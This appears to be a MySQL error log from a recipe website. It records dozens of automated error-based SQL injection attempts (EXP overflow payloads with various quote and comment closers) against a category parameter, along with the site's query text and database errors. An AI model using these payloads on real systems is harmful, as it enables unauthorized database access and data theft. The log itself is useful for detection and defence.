+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'fTly' FROM DUAL WHERE 2297=2297 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" WHERE 5795=5795 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (EL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" WHERE 5795=5795 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- bNaM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' WHERE 2009=2009 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (EL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' WHERE 2009=2009 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- TVvJ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") WHERE 7720=7720 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (E' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") WHERE 7720=7720 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- YGzP=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') WHERE 6620=6620 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (E' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') WHERE 6620=6620 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- TpyG=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND "fEIp" LIKE "fEIp=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ((("yXwM" LIKE "yXwM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND (("FTmM" LIKE "FTmM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ("rcDa" LIKE "rcDa=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND "lYAv"="lYAv=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ((("BjII"="BjII=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND (("Bpmr"="Bpmr=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ("sBGG"="sBGG=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND 'tNWM' LIKE 'tNWM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ((('lciG' LIKE 'lciG=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND (('Pdqx' LIKE 'Pdqx=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ('Giir' LIKE 'Giir=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND 'LqRU'='LqRU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ((('zdxk'='zdxk=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND (('NbJJ'='NbJJ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ('GKgw'='GKgw=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- VNam=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- CTwS=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- EfXe=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`) WHERE 1816=1816 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (E' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4`) WHERE 1816=1816 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- tPQq=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '` WHERE 7268=7268 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (EL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4` WHERE 7268=7268 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- EkLm=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AS QWuc WHERE 5488=5488 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AS QWuc WHERE 5488=5488 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- VeRa=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS fqqw WHERE 4503=4503 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AS fqqw WHERE 4503=4503 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- ejiO=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 6456=6456 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 WHERE 6456=6456 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- VqaG=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 1417=1417 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) WHERE 1417=1417 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- eZLM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))# gGDN=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- SweB=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND (((7253=7253=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1)))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND ((7088=7088=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:15
+SQLSTATE[22003]: Numeric value out of range: 1690 DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((4644 = 4644),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78)`) `x`)))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)) AND (9190=9190=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:15
+SQLSTATE[22003]: Numeric value out of range: 1690 DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((4644 = 4644),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78)`) `x`)))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- Mgrz=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' IN BOOLEAN MODE) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' IN BOOLEAN MODE) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AS lmhm WHERE 7421=7421 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AS lmhm WHERE 7421=7421 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- nmxM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AS qaAh WHERE 8769=8769 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AS qaAh WHERE 8769=8769 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- QqeF=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AS Ljiy WHERE 4464=4464 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AS Ljiy WHERE 4464=4464 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- EFNQ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AS Hjfu WHERE 8432=8432 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AS Hjfu WHERE 8432=8432 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- XdLC=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT 'MWrU' WHERE 1624=1624 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a62' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT 'MWrU' WHERE 1624=1624 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT dRjO WHERE 9842=9842 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a6278' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT dRjO WHERE 9842=9842 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'PEuW' WHERE 1795=1795 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a6' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'PEuW' WHERE 1795=1795 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'tRIv' FROM DUAL WHERE 1879=1879 AND EXP(~(SELECT * FROM (SELECT CONC' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'tRIv' FROM DUAL WHERE 1879=1879 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:12
